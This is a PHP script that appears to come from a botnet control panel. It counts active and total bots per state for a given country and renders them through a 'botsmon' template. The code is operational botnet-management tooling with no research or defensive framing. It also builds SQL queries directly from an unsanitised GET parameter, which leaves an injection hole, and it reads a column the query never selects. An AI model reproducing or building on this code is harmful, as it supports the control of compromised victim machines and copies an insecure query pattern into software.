<?
	include_once "../common.php";
	include_once ROOT_PATH."/mod/functs.php";
	include_once ROOT_PATH."/mod/geo.php";
	if( !$user->Check() ) exit;

	$idc = $_GET['idc']; if (!@$idc) exit();

	$res = $db->query("SELECT distinct city_t.state FROM city_t WHERE fk_country_city = $idc ORDER BY city_t.state");
	$cnt = $db->affected_rows;
	if ($cnt>0)
	{
		$RES = Array();
		for ($i = 0; $mres = $res->fetch_array(); $i++)
		{
			$res2 = $db->query("SELECT count(id_bot) FROM bots_t WHERE (fk_city_bot IN (SELECT id_city FROM city_t, country_t 
						WHERE fk_country_city = id_country AND id_country = $idc AND state = '".$mres['state']."')) 
						AND (status_bot <> 'offline')");
			$actb_cnt = -1;
			if ((@($res2)) && $db->affected_rows > 0)
			{
				$mres2 = $res2->fetch_array();
				$actb_cnt = $mres2[0];
			}

			$res2 = $db->query("SELECT count(id_bot) FROM bots_t WHERE fk_city_bot IN (SELECT id_city FROM city_t, country_t 
						WHERE fk_country_city = id_country AND id_country = $idc AND state = '".$mres['state']."')");
			$allb_cnt = -1;
			if ((@($res2)) && $db->affected_rows > 0)
			{
				$mres2 = $res2->fetch_array();
				$allb_cnt = $mres2[0];
			}

			$ccode = CountryCode($mres['name_country']);
		
			$RES[] = array('MRES_ST'=>$mres['state'], 'ACTB_CNT'=>$actb_cnt, 'ALLB_CNT'=>$allb_cnt);
		}
		$smarty->assign('CONT_ARR', $RES);
		$smarty->display('botsmon_state.tpl');
	} 
	else {$rslt .= "<p>message>> ERROR IN SELECTION OF 'COUNTRY_T'"; return; }
?>